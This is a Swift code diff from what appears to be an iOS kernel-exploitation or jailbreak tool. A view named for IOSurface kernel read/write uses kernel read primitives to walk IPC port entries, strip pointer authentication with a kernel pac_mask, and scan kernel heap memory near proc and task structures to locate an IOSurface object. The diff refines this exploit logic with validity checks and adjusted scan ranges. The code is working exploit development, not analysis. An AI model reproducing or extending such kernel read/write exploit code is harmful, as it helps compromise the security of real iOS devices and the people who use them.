@@ -353,15 +353,15 @@ struct BleedingEdgeIOSurfaceKRWView: View {
             let portPtr = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
             if portPtr == 0 { continue }
             
-            // Strip PAC
-            let port = portPtr & 0x0000007FFFFFFFFF
-            if port < 0xfffffff000000000 { continue }  // Invalid
+            // Strip PAC using kernel's pac_mask
+            let port = portPtr | pac_mask
+            guard ds_isvalid(port) else { continue }
             
             // Read kobject from port
             let kobject = ds_kread64(port + UInt64(off_ipc_port_ip_kobject))
             if kobject == 0 { continue }
-            let kobj = kobject & 0x0000007FFFFFFFFF
-            if kobj < 0xfffffff000000000 { continue }
+            let kobj = kobject | pac_mask
+            guard ds_isvalid(kobj) else { continue }
             
             // Check if this kobject contains our surface ID
             // IOSurface ID is typically at offset 0x10-0x20 in the object
@@ -379,23 +379,32 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         
         if iosurfaceKobject == 0 {
             report += "  IOSurface object not found in first 200 ports.\n"
-            report += "  Trying broader scan around known heap objects...\n\n"
+            report += "  Trying scan near known heap objects...\n\n"
             
-            // Alternative: scan near proc/task for surface ID
+            // Scan near proc for surface ID (safe — these are known heap addresses)
+            let scanRange: UInt64 = 0x2000
             let scanBases: [(String, UInt64)] = [
-                ("proc-0x1000", proc > 0x1000 ? proc - 0x1000 : proc),
-                ("task-0x1000", task > 0x1000 ? task - 0x1000 : task),
-                ("ucred-0x1000", ucred > 0x1000 ? ucred - 0x1000 : ucred),
+                ("proc", proc),
+                ("task", task),
             ]
             
             for (name, base) in scanBases {
-                for off in stride(from: 0, to: 0x2000, by: 4) {
-                    let val = ds_kread32(base + UInt64(off))
+                guard base > scanRange else { continue }
+                let scanStart = base - 0x1000
+                for off in stride(from: 0, to: Int(scanRange), by: 4) {
+                    let addr = scanStart + UInt64(off)
+                    guard ds_isvalid(addr) else { continue }
+                    let val = ds_kread32(addr)
                     if val == engine.surfaceID && engine.surfaceID != 0 {
-                        report += String(format: "  FOUND at %@+0x%x (addr=0x%llx)\n", name, off, base + UInt64(off))
-                        iosurfaceKobject = base + UInt64(off) - UInt64(off % 0x100)  // Align to likely object start
+                        report += String(format: "  FOUND at %@-0x1000+0x%x (addr=0x%llx)\n", name, off, addr)
+                        // Try to find object start (look for vtable-like pointer before)
+                        let possibleStart = addr - UInt64(off % 0x100)
+                        if ds_isvalid(possibleStart) {
+                            iosurfaceKobject = possibleStart
+                        }
                     }
                 }
+                if iosurfaceKobject != 0 { break }
             }
         }
         
